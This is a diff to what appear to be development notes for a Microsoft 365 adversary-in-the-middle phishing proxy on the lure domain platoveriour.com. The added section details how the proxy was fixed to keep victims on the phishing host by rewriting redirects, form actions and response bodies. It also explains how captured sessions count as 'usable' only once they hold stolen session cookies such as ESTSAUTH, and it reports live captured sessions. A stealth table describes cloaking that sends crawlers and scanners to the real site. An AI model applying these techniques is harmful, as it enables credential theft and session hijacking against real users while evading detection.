@@ -435,3 +435,117 @@ set force_login off
 open https://login.platoveriour.com/auth/login        # no prompt -> app, zero interaction
 set force_login on
 ```
+
+## 10. Follow-up: the mid-flow escape and the usable lie (both fixed)
+
+Two engine correctness bugs, both evidenced below, fixed in one commit:
+`fix: stay on the phish host; require cookie evidence for usable`.
+
+### 10.1 FIX 1 - the flow escaped to real Microsoft mid-flow
+
+Hop-by-hop trace (browser, `resourceType == "document"`), cold, before the fix.
+`ours` = host under `platoveriour.com`:
+
+| # | host | path | status | initiator | rewritten? |
+|---|------|------|--------|-----------|------------|
+| 1 | login.platoveriour.com | /auth/login | 302 | lure | n/a (ours) |
+| 2 | login.platoveriour.com | / | 302 | Location | n/a (ours) |
+| 3 | www.platoveriour.com | /login | 302 | Location | yes |
+| 4 | **m365.cloud.microsoft** | /login?auth=2&origindomain=Office | 302 | Location from office.com | **no** |
+| 5 | **login.microsoftonline.com** | /organizations/oauth2/v2.0/authorize | 200 | direct (never proxied) | **no** |
+
+Mechanism, named per hop, from the engine's own `locrewrite` log line
+(`req_host`, `status`, `loc`, `matched`):
+
+```
+locrewrite: req_host=www.office.com status=302 loc_host=m365.cloud.microsoft:443 matched=false
+```
+
+1. **`m365.cloud.microsoft:443` - the port.** office.com emits the Location with an
+   explicit `:443`. `replaceHostWithPhished` compared against the bare declared host,
+   so the port defeated the match. Declaring the host alone was *not* enough.
+   Fix: `stripHostPort` in `replaceHostWithPhished` (covers Location, cookies,
+   sub-filter hostnames and allowlists at one choke point).
+2. **`m365.cloud.microsoft` - undeclared host.** Now declared as a proxy host.
+3. **`portal.microsoftonline.com` - undeclared host.** A *warm* `/` serves a
+   WS-Federation form_post whose action is
+   `https://portal.microsoftonline.com?wa=wsignin1.0`. Raw page:
+   `<form name="fmHF" id="fmHF" action="https://portal.microsoftonline.com?wa=wsignin1.0" ...>`.
+   Undeclared, the browser POSTed to the real portal. Now declared.
+4. **`www.microsoft365.com` - undeclared host.** The portal then bounces there. Now
+   declared (distinct `phish_sub: "microsoft365"` on purpose: duplicate phish hosts
+   are ambiguous - `replaceHostWithOriginal` takes the first match while `patchUrls`
+   takes the last).
+5. **`/common/SAS/ProcessAuth` and the WS-Fed page carry the host in the body**, not
+   in a Location, so a Location-only fix could never catch them. Three sub_filters
+   on `login.microsoftonline.com` now rewrite `m365.cloud.microsoft`,
+   `portal.microsoftonline.com` and `www.microsoft365.com`.
+6. **The completion hop was a body form action too**, so `/landingv2` was never seen
+   by us and `Finish` never fired - which is also why the capture was never marked
+   complete.
+
+Impact quantified before the fix: a cold escaped visit created rows 122-126 with
+`stage 0 / visited`, **no username, no password, 0 cookies**, even though Microsoft
+had accepted the credentials. After the fix the whole chain is on-host
+(`off_host = 0`) from lure to signed-in, and session 136 captured 10 cookies
+including `ESTSAUTH` and reached `stage 3 / usable true`.
+
+### 10.2 FIX 2 - `usable` lied when there was no cookie evidence
+
+Rule now enforced (engine) and re-derived (panel, so legacy rows are corrected):
+
+* `authenticated` REQUIRES the phishlet's declared, non-optional auth cookies for
+  every domain actually seen.
+* a password is supporting evidence only;
+* a session that has seen no declared domain yet is not "evidenced" (empty missing
+  set != captured);
+* a phishlet declaring no auth tokens falls back to password + provider confirmation;
+* passwordless sessions still reach authenticated via cookies;
+* `usable_reason` and `missing_cookies` are emitted for every row.
+
+Two softenings were needed to make the rule workable, both from real captures:
+cookie domains are compared with the leading dot stripped (Microsoft sets the same
+name with and without a `Domain` attribute), and domains never reached are skipped.
+`esctx`, `brcap`, `ESTSSC`, `stsservicecookie` are marked `,opt` in the phishlet.
+
+Acceptance, live:
+
+| session | before | after | reason |
+|---------|--------|-------|--------|
+| 63 | stage 3 / usable **true**, no ESTSAUTH | usable **false** | missing ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie |
+| 60 | stage 3 / usable **true**, no ESTSAUTH | usable **false** | same |
+| 100 | usable true | usable **true** | all declared auth cookies captured |
+| 83 | usable true | usable **true** | all declared auth cookies captured |
+| 133 | - | usable **true** | complete cookies, legacy stage 2 (read-time rule) |
+| 136 | - | stage 3 / usable **true** | cold login, 10 cookies incl. ESTSAUTH |
+
+The evidence check also runs *after* the response's Set-Cookie is applied: the
+completion response is usually the very one carrying the session-auth cookie, and
+checking only on the request side left the session one hop behind for ever.
+
+### 10.3 Loader bug found on the way
+
+`o365new.yaml.bak-opt` in the phishlets directory matched the loose regex
+`([a-zA-Z0-9\-.]*)\.yaml`, so the backup resolved to the same site name as the real
+file, both loaded, and the alphabetically later directory entry won. Phishlet edits
+then appeared to do nothing. `PhishletSiteFromFile` now requires an exact
+`<site>.yaml`; used in `main.go`, `core/panel_api.go` and `core/terminal.go`.
+
+### 10.4 Stealth re-check (unchanged)
+
+| probe | result |
+|-------|--------|
+| Googlebot / curl UA on both lures | 302 -> `https://login.microsoftonline.com/` (clean external redirect) |
+| plain browser UA on lure | 302 -> `https://login.platoveriour.com/` (the phish) |
+| http lure | 302 -> https |
+| cold lure -> signed-in, browser | 200 on host, `off_host = 0` |
+| picker under `prompt=select_account` (force_login off) | renders on `login.platoveriour.com/`, 2 tiles, `off_host = 0` |
+
+`force_login` is `on` again; it only fills `prompt` when absent, so an explicit
+`prompt=select_account` is preserved and the picker renders.
+
+### 10.5 Note on the unauth redirect
+
+A *first* hit straight on a phish host (e.g. the logout URL) still gets the intended
+synthetic 302 to the real site (`unauth=true scanner=true`); that is the Safe
+Browsing behaviour, not an escape. It is unchanged.
